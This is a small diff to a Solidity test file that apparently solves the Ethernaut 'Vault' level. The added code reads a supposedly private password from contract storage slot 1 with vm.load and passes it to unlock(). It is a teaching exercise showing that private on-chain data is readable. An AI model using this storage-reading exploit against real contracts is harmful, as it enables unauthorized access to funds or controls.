@@ -29,6 +29,14 @@ contract VaultTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        bytes32 password = vm.load(
+            address(ethernautVault),
+            bytes32(uint256(1))
+        );
+        emit log_bytes32(password);
+
+        ethernautVault.unlock(password);
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
